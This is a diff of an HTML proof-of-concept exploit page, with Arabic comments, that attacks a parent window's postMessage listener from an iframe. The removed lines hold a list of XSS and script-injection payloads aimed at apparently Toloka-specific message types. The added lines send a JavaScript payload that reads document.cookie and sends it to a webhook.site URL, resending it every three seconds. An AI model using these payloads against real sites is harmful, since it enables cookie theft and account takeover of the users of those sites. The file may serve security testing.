@@ -1,32 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Iframe Attack</title>
+  <title>PoC: iframe attack via postMessage</title>
 </head>
 <body>
-  <h1>🔥 iframe PoC</h1>
+  <h1>PoC: Sending raw JS payload via postMessage</h1>
+
   <script>
-    const targetOrigin = "*"; // رغم أن الأم تتحقق غالبًا، نرسل إلى الجميع
+    const payload = `
+      console.log('🔥 Executed from child iframe');
+      document.body.innerHTML += '<h1 style="color:red">Exploit Successful 🔥</h1>';
+      fetch('https://webhook.site/xxx?cookie=' + encodeURIComponent(document.cookie));
+    `;
 
-    const payloads = [
-      { type: "TOLOKA_SET_CONFIG", config: { darkMode: true, lang: "ru" } },
-      { type: "TOLOKA_UI_UPDATE", element: "header", content: "<h1>🔥 PWNED</h1>" },
-      { type: "TOLOKA_RUN_SCRIPT", script: "alert('Code from iframe executed in parent')" },
-      { type: "task-update", task: { id: "123", name: "Fake Task", html: "<script>alert('TASK PWNED')</script>" } },
-      { type: "eval", payload: "console.log('Executed by eval inside parent')" },
-      { type: "config", payload: { update: true, lang: "en", inject: "</script><img src=x onerror=alert(1)>" } },
-      { type: "rpc", method: "setTitle", args: ["🔥 Set from iframe"] },
-      { type: "set", key: "hacked", value: "<img src=x onerror=alert(document.domain)>" },
-    ];
+    const message = {
+      type: "exploit-payload",
+      payload: payload,
+      origin: location.origin,
+      time: new Date().toISOString()
+    };
 
-    function sendAllPayloads() {
-      payloads.forEach(p => {
-        console.log("📤 Sending:", p);
-        window.parent.postMessage(p, targetOrigin);
-      });
-    }
+    console.log("📤 Sending payload to parent window...");
+    window.parent.postMessage(payload, "*");
 
-    setInterval(sendAllPayloads, 3000); // كل 3 ثواني لإزعاج المستلم
+    // إعادة الإرسال كل ثواني قليلة لمحاولة اختراق event listener في parent
+    setInterval(() => {
+      window.parent.postMessage(payload, "*");
+    }, 3000);
   </script>
 </body>
 </html>
